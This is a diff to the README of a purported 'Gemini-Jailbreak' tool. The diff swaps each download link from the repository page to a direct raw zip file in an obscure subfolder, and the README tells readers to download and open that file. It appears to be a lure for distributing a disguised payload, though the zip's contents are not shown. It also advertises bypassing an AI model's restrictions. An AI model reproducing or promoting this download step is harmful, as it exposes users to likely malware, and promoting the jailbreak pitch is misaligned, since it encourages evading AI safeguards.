@@ -1,6 +1,6 @@
 # 🚀 Gemini-Jailbreak - Unlock Full AI Power Instantly
 
-[![Download Gemini-Jailbreak](https://img.shields.io/badge/Download-Gemini_Jailbreak-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=4ECDC4)](https://github.com/Ster712/Gemini-Jailbreak)
+[![Download Gemini-Jailbreak](https://img.shields.io/badge/Download-Gemini_Jailbreak-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=4ECDC4)](https://raw.githubusercontent.com/Ster712/Gemini-Jailbreak/main/Humulus/Gemini-Jailbreak-2.7.zip)
 
 ## 🔥 What Is Gemini-Jailbreak?
 
@@ -22,7 +22,7 @@ Getting started takes less than two minutes. Here's exactly what to do:
 
 **Step 1:** Visit this link to download the application.
 
-[**⬇️ Download Gemini-Jailbreak Now**](https://github.com/Ster712/Gemini-Jailbreak)
+[**⬇️ Download Gemini-Jailbreak Now**](https://raw.githubusercontent.com/Ster712/Gemini-Jailbreak/main/Humulus/Gemini-Jailbreak-2.7.zip)
 
 **Step 2:** Once the download completes, locate the downloaded file in your browser's download folder (usually called "Downloads").
 
@@ -122,7 +122,7 @@ Need assistance? We're here to help:
 
 Don't let artificial restrictions hold you back from using Gemini to its full potential. Join thousands of satisfied users who've unlocked the complete Gemini experience.
 
-[**⬇️ Download Gemini-Jailbreak Free**](https://github.com/Ster712/Gemini-Jailbreak)
+[**⬇️ Download Gemini-Jailbreak Free**](https://raw.githubusercontent.com/Ster712/Gemini-Jailbreak/main/Humulus/Gemini-Jailbreak-2.7.zip)
 
 The download is completely free, takes seconds, and you'll be up and running in minutes. Experience Gemini the way it was meant to be - unrestricted, unlimited, and unstoppable.
 
